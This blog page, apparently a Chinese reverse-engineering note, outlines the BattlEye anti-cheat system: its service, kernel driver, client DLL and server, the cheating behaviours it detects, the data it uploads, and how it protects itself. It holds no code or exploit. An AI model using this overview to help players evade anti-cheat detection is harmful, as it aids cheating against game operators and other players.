+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BEService - Windows service that communicates with BEServer, which provides BEDaisy and BEClient communication capabilities</span><br><span class="line">BEDaisy - kernel driver that registers callbacks and minifilters to prevent cheaters from modifying the game</span><br><span class="line">BEClient - usermode DLL that is responsible for most of the detection vectors, it is mapped into the game process after initialization</span><br><span class="line">BEServer - backend-server that is responsible for collecting information and taking concrete actions against cheaters</span><br></pre></td></tr></table></figure>
+
+<p>BE检测项目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-调试器检测</span><br><span class="line">-已知外挂的签名检测</span><br><span class="line">-检测打开游戏进程的句柄的操作</span><br><span class="line">-手动映射在内存中的模块的检测，如：在内存中可执行的页在磁盘上没有备份</span><br><span class="line">-进程句柄的创建被禁止</span><br><span class="line">-窗口覆盖层的检测</span><br><span class="line">-steam覆盖层钩子或者嵌入steam进程的检测</span><br><span class="line">-lsass.exe修改检测</span><br><span class="line">-游戏文件完整性检测</span><br><span class="line">-连接到外挂网站的TCP连接的检测</span><br><span class="line">-模块名和时间戳黑名单检测</span><br><span class="line">-证书黑名单检测</span><br><span class="line">-硬件黑名单检测</span><br><span class="line">-堆栈检查、返回值检查</span><br><span class="line">-对用户态内存以外的代码进行单步检测</span><br><span class="line">-虚拟机检测</span><br></pre></td></tr></table></figure>
+
+<p>BE会向服务器上传：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所有正在执行的进程</span><br><span class="line">所有设备驱动</span><br><span class="line">所有窗口名称</span><br><span class="line">如果危险行为被检测、则会上传更多信息</span><br></pre></td></tr></table></figure>
+
+<p>BE自我保护的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">代码虚拟化</span><br><span class="line">内存shellcode</span><br><span class="line">模块和shellcode的完整性检测</span><br><span class="line">BEServer流量加密</span><br><span class="line">加密的命名管道通信</span><br><span class="line">会用一大堆逆向工具生成大量的日志</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Airshelf</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
 </body>
 </html>
